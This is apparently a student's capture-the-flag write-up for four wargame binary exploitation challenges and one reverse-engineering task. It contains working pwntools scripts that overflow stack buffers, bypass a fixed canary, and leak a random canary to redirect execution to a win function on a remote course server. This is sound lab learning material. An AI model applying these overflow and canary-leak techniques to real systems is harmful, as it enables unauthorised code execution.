# Jump

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1qdW1wIiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6IjQ5N2MyY2U4LTZmMWItNDRhZC1hMDM2LWE5ZjMwMjgyM2ExZCJ9.Zp_Ha0jdlWXWIrG1Gzeao66MVrYjPVenv7Xjnh4b_sM}

## Scenario

The function address for the win function is given to us, which we need to execute somehow.

## Solution

We need to override the function pointer variable (`ebp - 0x8`) through the `gets` call. The distance between memory addresses of the function pointer variable and the string buffer (`ebp - 0x48`) is `0x40` bytes.  
We should send 0x40 bytes of pad followed by the address of the win function.

## Script

```python3
from pwn import *
import re

# p = process("./jump")
p = remote("plsdonthaq.me", 2001)

data = p.recv()
print(data)

addr = p32(int(re.findall(b"0x(.+?)\n", data)[0],16))
print("Address:", addr)

p.sendline(b"D" * 0x40 + addr)

print(p.recvline())
p.interactive()
```

---

# Blind

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1ibGluZCIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiI3ZTY2NTdjZC1jMmVhLTQxODctOGVkYS04NjBmYjIwMzY2MjQifQ.eJtKsig1PeUznaWQfwnEUDiUJ96x11WGKe7Z0x8W5X4}

## Scenario

A binary is given, without any immediately visible indicators.  

## Solution

Looking at the disassembly of the binary, there is a `win` function (`0x80484d6`), and a `vuln` function that is called by main. A `gets` call stores data into `ebp - 0x44` / `esp - 0x48`. We can perform a buffer overflow with `0x48` bytes of padding to modify the return address of `vuln` to our `win` function.

## Script

```python3
from pwn import *
import re

# p = process("./blind")
p = remote("plsdonthaq.me", 2002)

# Address: 0x80484d6

data = p.recv()
print(data)

# ebp-0x44 
# | ebp-0x44 | ebp | ebp+4 |

p.sendline(b"D" * 0x48 + b"\xd6\x84\x04\x08")
# print(p.poll(block=True))

p.interactive()
```

---

# Best Security

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1iZXN0c2VjdXJpdHkiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiMjc0NzY5OWQtNWUxYS00ODk4LThmMTctODZmOTBhODA4NWQxIn0.9iwq1tjeDQimDfLdAZzMITKmn3Oveg4Syl7ymfLNF50}

## Scenario

A fixed-value stack canary of "1234" is hardcoded into the binary.

## Solution

The value of the canary is stored in `ebp - 0x5`, and the `gets` buffer is pointed to `ebp - 0x85`.  
We need to pad `0x80` bytes, then send "1234" in order to override the canary.

## Script

```python3
from pwn import *
import re

# # Hi Ben
# for i in range(0, 0x88):
#     print(i, "pads")
#     p = process("./bestsecurity")
#     data = p.recv()

#     p.sendline(b"D" * i + b"1234")
#     p.recv()
#     p.poll(block=True)
#     # Stonks

# p = process("./bestsecurity")
p = remote("plsdonthaq.me", 2003)
data = p.recv()
p.sendline(b"D" * 0x80 + b"1234")
p.interactive()
```

---

# Stack Dump

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1zdGFjay1kdW1wIiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6IjFmOWU2MDg0LTcwYWYtNGQ4ZC1iMjQ0LTRmZWM3MTIwNzEyYSJ9.tHWl0iqtGoZOdgOIBmBJRaHWwOG_-s-8VR3g5Dxk1jk}

## Scenario

The given binary file initialises a random-valued stack canary.  
When the quit function is called, the program checks if the stack canary has changed or not - crashing if it has.

## Solution

Through the given functions we need to override the return address to the win function, whilst maintaining the correct canary value.

* Buffer at `ebp - 0x68`
* Canary at `ebp - 0x8`
* Win function at `0x80486c6`

The stack pointer is revealed to us as the start of the program.  
Upon analysing the binary, we find that `esp = ebp - 0x71`.  
Likewise, `ebp = esp + 0x71`

We can leak the canary (`ebp - 0x8) by writing the address of the canary through the input data function, then calling the dump memory function. Once we have the canary, we can overflow the buffer with padding, the canary value, more padding and the win function address.

When the quit function is called, our buffer overflow ensures that the canary is the correct value, and hence proceeds and returns to our win function.

## Script

```python3
from pwn import *
import re


# p = process("./stack-dump")
p = remote("plsdonthaq.me", 2004)

p.recvline() # Lets try a real stack canary, like the ones GCC uses

ptrLine = p.recvline()
sp = int(re.findall(b"0x(.+?)\n", ptrLine)[0],16)
bp = sp + 0x71

print(ptrLine, p32(sp))

p.recv()

# Loop

def inputData(length, data):
    # print("Do input")
    if type(length) is int:
        length = str(length) 
    p.sendline("a")
    p.recv()
    p.sendline(length) # gets used, can modify other memory addresses
    p.sendline(data) # Write into variable, limited by atoi(length)
    p.recv()
    p.recv(timeout=1)
    ### Could set length to a very large number, then write arbitrary data with data
    ### Could also just write arbitrary data with length

def dumpMemory():
    # print("Do dump")
    p.sendline("b")
    p.recvuntil(': ')
    data = p.recvline(keepends=False) 
    # print("Line: ", data)
    p.recv()
    p.recv(timeout=1)
    return data

def quit():
    p.sendline("d")
    p.interactive()
    try:
        print("Quit:", p.recv())
    except:
        print("Quit:", "No data on quit")
        pass

# buffer at ebp-0x68
# canary at ebp-0x8
# return address somewhere around ebp

# Need to overwrite the return address
# Leak the canary through inputData -> dumpMemory
# # The stack pointer is ebp-0x71, so ebp is esp+0x71
# # The canary is located at ebp-0x08

# Then use inputData to write PAD + CANARY + PAD +  WIN (0x80486c6)
# The first pad is the buffer
# The second pad is 8 bytes for the pushed ebx and ebp

inputData(4, p32(bp-0x08)) # Set location to dump to the canary location
canary = dumpMemory()[:4]  # Extract the canary
inputData(0x68 + 8, b"A"*0x60 + canary + b'A'*8 + b'\xc6\x86\x04\x08')
                    # PAD                # PAD    # Win Function    
quit()
```

---

# Reverse Engineering

The function `main` performs a `scanf` call, which an the integer into the variable at address `ebp - 0xc`. This value is then compared to `0x539` (1337), which if true prints out _"Your so leet!"_, else _"Bye"_. The program returns with the status code `1`

> gcc -m32 -fno-stack-protector -fno-pic reversing.c

```c
#include <stdio.h>

int main(int argc) {
    int var_14;
    scanf("%d", &var_14);

    if (var_14 == 1337) {
        puts("Your so leet!"); // You're *
    } else {
        puts("Bye");
    }

    return 1;
}
```